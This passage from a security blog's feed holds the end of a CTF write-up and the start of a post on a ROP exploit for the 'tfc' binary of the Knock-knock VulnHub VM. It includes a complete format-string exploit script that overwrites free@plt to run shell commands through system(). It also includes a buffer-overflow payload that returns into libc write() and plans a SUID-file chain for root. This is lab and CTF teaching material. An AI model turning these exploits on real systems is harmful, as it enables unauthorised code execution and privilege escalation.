</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;666</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># invoke Show Profit &amp;&amp; trigger format string exploit</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;4</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive dummy bytes</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">342</span><span class="p">):</span>
</span><span class='line'>  <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.01</span><span class="p">)</span>
</span><span class='line'>  <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">100</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># add mine, supply a string format argument which</span>
</span><span class='line'><span class="c"># overwrites the last two bytes of free@plt pointer</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># we need to write the value 0x0804, which is 2052 </span>
</span><span class='line'><span class="c"># in decimal</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;</span><span class="si">%2052c</span><span class="s">%11$hn</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="c"># -&gt; 0x804 in hex</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># pointer to free@plt+2</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;AA</span><span class="se">\x16\xb0\x04\x08</span><span class="s">CCCC</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># don&#39;t care</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;666</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># invoke Show Profit &amp;&amp; trigger format string exploit</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;4</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;n</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># receive extra bytes (from the string format exploit)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">2400</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># send payload, in another mine. we&#39;re going to delete it </span>
</span><span class='line'><span class="c"># right away to call system()</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># shell command goes here</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;cat secret.txt 2&amp;&gt;1</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># second command</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;bleh</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span> <span class="c">#0x804b02c</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># third command</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;blah</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="c"># invoke Delete Mine, which triggers system() which our commands</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;3</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;n</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;n</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s">&#39;y</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'><span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">512</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>After running this exploit, it returns the flag:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>3^JDo you want to delete?
</span><span class='line'>Location: %34272c%11<span class="nv">$hn</span>
</span><span class='line'>Type: AA..CCCC
</span><span class='line'>y/n
</span><span class='line'>
</span><span class='line'>n^JDo you want to delete?
</span><span class='line'>Location: %2052c%11<span class="nv">$hn</span>
</span><span class='line'>Type: AA..CCCC
</span><span class='line'>y/n
</span><span class='line'>
</span><span class='line'>n^JDo you want to delete?
</span><span class='line'>Location: cat secret.txt 2<span class="p">&amp;</span>&gt;1
</span><span class='line'>Type: bleh
</span><span class='line'>y/n
</span><span class='line'>
</span><span class='line'>y^JFLAG<span class="o">{</span>d1aM0nd&gt;G0lD<span class="o">}</span>
</span><span class='line'>1<span class="o">)</span> Add mine
</span><span class='line'>2<span class="o">)</span> Show mines
</span><span class='line'>3<span class="o">)</span> Delete mine
</span><span class='line'>4<span class="o">)</span> Show profit
</span><span class='line'>5<span class="o">)</span> Exit
</span><span class='line'>id^J
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>flag{d1aM0nd&gt;G0lD}</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Rop-rop for Knock-knock]]></title>
    <link href="http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock/"/>
    <updated>2014-10-16T19:37:39+02:00</updated>
    <id>http://barrebas.github.io/blog/2014/10/16/rop-rop-for-knock-knock</id>
    <content type="html"><![CDATA[<p>I couldn&rsquo;t resist to make a ROP exploit for <code>tfc</code>, the last binary to root <a href="http://vulnhub.com/entry/knock-knock-11,105/">knock-knock</a>.</p>

<!--more-->


<p>I really like return-oriented-programming and I love to practice it! After seeing the awesome writeups for knock-knock by <a href="https://leonjza.github.io/blog/2014/10/14/knock-knock-whos-there-solving-knock-knock/">leonjza</a>, <a href="https://blog.techorganic.com/2014/10/15/knock-knock-hacking-challenge/">superkojiman</a> and <a href="https://knapsy.github.io/blog/2014/10/16/knock-knock-vm-walkthrough/">knapsy</a>, I was itching to see if I could pull a ROP exploit off. I knew about the buffer overflow, but what would I need to re-use code present in the binary? There are many &lsquo;types&rsquo; of ROP, such as <code>ret2libc</code> and chaining of so-called ROP gadgets. I first checked if there were enough gadgets to pull something off, like spawning a shell. <code>radare2</code> now has a nice feature where you can search for ROP gadgets with <code>/R</code>. Furthermore, <code>gdb-peda</code> has an awesome ROP gadget search function. Lastly, I <a href="https://gist.github.com/barrebas/4fc86eaf0e9b124813a3">built a custom ROP gadget dumper</a>. Not the most elegant solution, but it gives me a file I can <code>cat</code> and <code>grep</code>. Unfortunately, the amount of gadgets was only 107 and they weren&rsquo;t really useful, either. Back to the drawing board!</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="c"># sample output of ropgadgets.py</span>
RET: 0x8048921: add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
RET: 0x804891f: add <span class="o">[</span>eax<span class="o">]</span>, al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
CALL_REG: 0x8048917: and al, 0xe8<span class="p">;</span> call ebx<span class="p">;</span> 
CALL_REG: 0x8048911: dec dword <span class="o">[</span>ebx+0x489f045<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> call ebx<span class="p">;</span> 
JMP_REG: 0x8048753: and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
JMP_REG: 0x804874d: fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
JMP_REG: 0x804874b: and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
JMP_REG: 0x804874a: inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
JMP_REG: 0x8048748: add edi, eax<span class="p">;</span> inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
JMP_REG: 0x8048747: rol byte <span class="o">[</span>ecx<span class="o">]</span>, 0xc7<span class="p">;</span> inc esp<span class="p">;</span> and al, 0x4<span class="p">;</span> fisttp dword <span class="o">[</span>edx+0x4890804<span class="o">]</span><span class="p">;</span> and al, 0xe8<span class="p">;</span> jmp edi<span class="p">;</span> 
RET: 0x80486e3: add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
RET: 0x80486e1: add <span class="o">[</span>eax<span class="o">]</span>, al<span class="p">;</span> add cl, cl<span class="p">;</span> ret<span class="p">;</span> 
RET: 0x8048615: dec ecx<span class="p">;</span> ret<span class="p">;</span></code></pre></div>


<p>There are more ways to go about this problem. We want to do something that will lead to a root shell, without actually executing shellcode on the stack. But without enough gadgets, we&rsquo;re left with not much else. But wait! We still have access to the functions that the binary uses.</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>objdump -d tfc <span class="p">|</span>grep <span class="s2">&quot;.plt&quot;</span> 
Disassembly of section .plt:

<span class="m">08048430</span> &lt;strcmp@plt-0x10&gt;:
 8048430:   ff <span class="m">35</span> 4c 9d <span class="m">04</span> <span class="m">08</span>      pushl  0x8049d4c
 8048436:   ff <span class="m">25</span> <span class="m">50</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d50
 804843c:   <span class="m">00</span> <span class="m">00</span>                 add    %al,<span class="o">(</span>%eax<span class="o">)</span>
    ...

<span class="m">08048440</span> &lt;strcmp@plt&gt;:
 8048440:   ff <span class="m">25</span> <span class="m">54</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d54
 8048446:   <span class="m">68</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x0</span>
 804844b:   e9 e0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

<span class="m">08048450</span> &lt;<span class="nb">read</span>@plt&gt;:
 8048450:   ff <span class="m">25</span> <span class="m">58</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d58
 8048456:   <span class="m">68</span> <span class="m">08</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x8</span>
 804845b:   e9 d0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

<span class="m">08048460</span> &lt;<span class="nb">printf</span>@plt&gt;:
 8048460:   ff <span class="m">25</span> 5c 9d <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049d5c
 8048466:   <span class="m">68</span> <span class="m">10</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x10</span>
 804846b:   e9 c0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

<span class="m">08048470</span> &lt;__xstat@plt&gt;:
 8048470:   ff <span class="m">25</span> <span class="m">60</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d60
 8048476:   <span class="m">68</span> <span class="m">18</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x18</span>
 804847b:   e9 b0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

<span class="m">08048480</span> &lt;puts@plt&gt;:
 8048480:   ff <span class="m">25</span> <span class="m">64</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d64
 8048486:   <span class="m">68</span> <span class="m">20</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x20</span>
 804848b:   e9 a0 ff ff ff          jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

<span class="m">08048490</span> &lt;__gmon_start__@plt&gt;:
 8048490:   ff <span class="m">25</span> <span class="m">68</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d68
 8048496:   <span class="m">68</span> <span class="m">28</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x28</span>
 804849b:   e9 <span class="m">90</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484a0 &lt;open@plt&gt;:
 80484a0:   ff <span class="m">25</span> 6c 9d <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049d6c
 80484a6:   <span class="m">68</span> <span class="m">30</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x30</span>
 80484ab:   e9 <span class="m">80</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484b0 &lt;__libc_start_main@plt&gt;:
 80484b0:   ff <span class="m">25</span> <span class="m">70</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d70
 80484b6:   <span class="m">68</span> <span class="m">38</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x38</span>
 80484bb:   e9 <span class="m">70</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484c0 &lt;write@plt&gt;:
 80484c0:   ff <span class="m">25</span> <span class="m">74</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d74
 80484c6:   <span class="m">68</span> <span class="m">40</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x40</span>
 80484cb:   e9 <span class="m">60</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484d0 &lt;strrchr@plt&gt;:
 80484d0:   ff <span class="m">25</span> <span class="m">78</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d78
 80484d6:   <span class="m">68</span> <span class="m">48</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x48</span>
 80484db:   e9 <span class="m">50</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484e0 &lt;__lxstat@plt&gt;:
 80484e0:   ff <span class="m">25</span> 7c 9d <span class="m">04</span> <span class="m">08</span>      jmp    *0x8049d7c
 80484e6:   <span class="m">68</span> <span class="m">50</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x50</span>
 80484eb:   e9 <span class="m">40</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;

080484f0 &lt;close@plt&gt;:
 80484f0:   ff <span class="m">25</span> <span class="m">80</span> 9d <span class="m">04</span> <span class="m">08</span>       jmp    *0x8049d80
 80484f6:   <span class="m">68</span> <span class="m">58</span> <span class="m">00</span> <span class="m">00</span> <span class="m">00</span>           push   <span class="nv">$0x58</span>
 80484fb:   e9 <span class="m">30</span> ff ff ff           jmp    <span class="m">8048430</span> &lt;_init+0x2c&gt;</code></pre></div>


<p>We can re-use <code>open</code>, <code>read</code> and <code>write</code> to basically read and write any file we want! I began to write a basic Proof of Concept ROP chain. This chain would simply write to a file descriptor that is already open. These file descriptors are incremented every time a file is opened and therefore guessable. This will help later on, when we open our own files. Without gadgets, it is hard to pass values from one function call to the next&hellip; Luckily, 0x0 through 0x2 are used for stdin, stdout and stderr, and any file that is opened after that gets 0x3. The next one gets 0x4, and so on. This means that <code>in.tfc</code> is 0x3 and <code>out.tfc</code> is 0x4.</p>

<p>I searched for the address of <code>write@plt</code> which turned out to be <code>0x80484c0</code>. I leveraged my buffer overflow from before to take control of code execution. We supply a large input of at least 4124 bytes. The buffer overflows, the return address on the stack is overwritten with the address of <code>write</code>. When the <code>ret</code> statement executes, we take control of code execution. Because the address points to <code>write</code>, this function will be executed using values conveniently placed on the stack. So at the point of gaining control of <code>eip</code>:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="n">esp</span><span class="o">-</span><span class="mo">04</span><span class="o">:</span> <span class="n">AAAA</span>
<span class="n">esp</span><span class="o">--&gt;:</span> <span class="mh">0x80484c0</span>   <span class="err">#</span> <span class="k">return</span> <span class="n">to</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">+</span><span class="mo">04</span><span class="o">:</span> <span class="n">FAKE</span>        <span class="err">#</span> <span class="n">fake</span> <span class="k">return</span> <span class="n">address</span> <span class="k">for</span> <span class="n">when</span> <span class="err">&#39;</span><span class="n">write</span><span class="err">&#39;</span> <span class="n">complets</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">08</span><span class="o">:</span> <span class="mh">0x4</span>         <span class="err">#</span> <span class="n">this</span> <span class="n">is</span> <span class="n">the</span> <span class="n">file</span> <span class="n">descriptor</span> <span class="k">for</span> <span class="err">&#39;</span><span class="n">out</span><span class="p">.</span><span class="n">tfc</span><span class="err">&#39;</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="nl">c</span><span class="p">:</span> <span class="mh">0x80488b0</span>   <span class="err">#</span> <span class="n">random</span> <span class="n">value</span> <span class="k">for</span> <span class="n">buffer</span><span class="p">,</span> <span class="n">contains</span> <span class="n">the</span> <span class="n">bytes</span> <span class="mi">8</span><span class="n">b</span> <span class="mi">45</span> <span class="n">ec</span>
<span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="o">:</span> <span class="mh">0x3</span>         <span class="err">#</span> <span class="n">length</span> <span class="n">of</span> <span class="n">buffer</span></code></pre></div>


<p>I ran this through the encryption Python script and fed the output to <code>tfc</code>:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash">python -c <span class="s1">&#39;print &quot;A&quot;*4124 + &quot;\xc0\x84\x04\x08AAAA\x04\x00\x00\x00\xb0\x88\x04\x08\x03\x00\x00\x00&quot;&#39;</span> &gt; in.tfc <span class="o">&amp;&amp;</span> python ./enc.py
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>./tfc out2.tfc test5.tfc
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>xxd test5.tfc
0000000: 8b45 ec</code></pre></div>


<p>Success! The three bytes from the buffer are written into <code>test5.tfc</code>. This isn&rsquo;t very useful yet, so I decided to create my own file first. This way, we can specify permissions, such as having the SUID bit set! The plan, in very ugly pseudo-code, is:</p>

<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="nv">file1</span> <span class="o">=</span> open<span class="o">(</span><span class="s1">&#39;file1&#39;</span>, <span class="s1">&#39;w&#39;</span>, 04777<span class="o">)</span>
<span class="nv">file2</span> <span class="o">=</span> open<span class="o">(</span><span class="s1">&#39;file2&#39;</span>, <span class="s1">&#39;r&#39;</span><span class="o">)</span>
<span class="nb">read</span><span class="o">(</span>file2, <span class="p">&amp;</span>buf, sizeof<span class="o">(</span>file2<span class="o">))</span>
write<span class="o">(</span>file1, <span class="p">&amp;</span>buf, sizeof<span class="o">(</span>file1<span class="o">))</span></code></pre></div>


<p>I&rsquo;ll go step by step. First, let&rsquo;s open our own file. The functions <a href="http://linux.die.net/man/2/open">open</a> and <a href="http://linux.die.net/man/2/write">write</a> look like this:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="nf">open</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">pathname</span><span class="p">,</span> <span class="kt">int</span> <span class="n">flags</span><span class="p">,</span> <span class="kt">mode_t</span> <span class="n">mode</span><span class="p">);</span>
<span class="kt">ssize_t</span> <span class="nf">write</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">const</span> <span class="kt">void</span> <span class="o">*</span><span class="n">buf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">count</span><span class="p">);</span></code></pre></div>


<p>There are several challenges here. First, we cannot specify our own filename, because we cannot pass strings to the program and know where they&rsquo;ll end up on the stack. Second, we can&rsquo;t pass the filehandle around. Third, I have no clue how <code>flags</code> and <code>mode</code> work, in binary. Fourth, we need some way to clean up the stack so we can chain these libc calls together.</p>

<p>Overcoming the first challenge is easy. <code>tfc</code> contains several strings which we can re-use. I chose &lsquo;read&rsquo; as I though it was fitting. It&rsquo;s located at <code>0x8049315</code>. For the output file, I already looked up the location of &lsquo;write&rsquo; at <code>0x804933e</code>. I then proceeded to make a small binary, to get the values for <code>flags</code> and <code>mode</code>:</p>

<div class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;</span>
<span class="cp">#include &lt;stdlib.h&gt;</span>
<span class="cp">#include &lt;sys/types.h&gt;</span>
<span class="cp">#include &lt;sys/stat.h&gt;</span>
<span class="cp">#include &lt;fcntl.h&gt;</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> 
<span class="p">{</span>
    <span class="kt">FILE</span> <span class="o">*</span><span class="n">f</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="s">&quot;test&quot;</span><span class="p">,</span> <span class="n">O_WRONLY</span><span class="o">|</span><span class="n">O_APPEND</span><span class="o">|</span><span class="n">O_CREAT</span><span class="p">,</span> <span class="mo">04755</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="p">}</span></code></pre></div>




<div class="highlight"><pre><code class="language-bash" data-lang="bash">bas@tritonal:~/tmp/knockknock<span class="nv">$ </span>objdump -d a.out <span class="p">|</span>grep open -B4
--
  400579:   ba ed <span class="m">09</span> <span class="m">00</span> <span class="m">00</span>         mov    <span class="nv">$0x9ed</span>,%edx
  40057e:   be <span class="m">41</span> <span class="m">04</span> <span class="m">00</span> <span class="m">00</span>          mov    <span class="nv">$0x441</span>,%esi
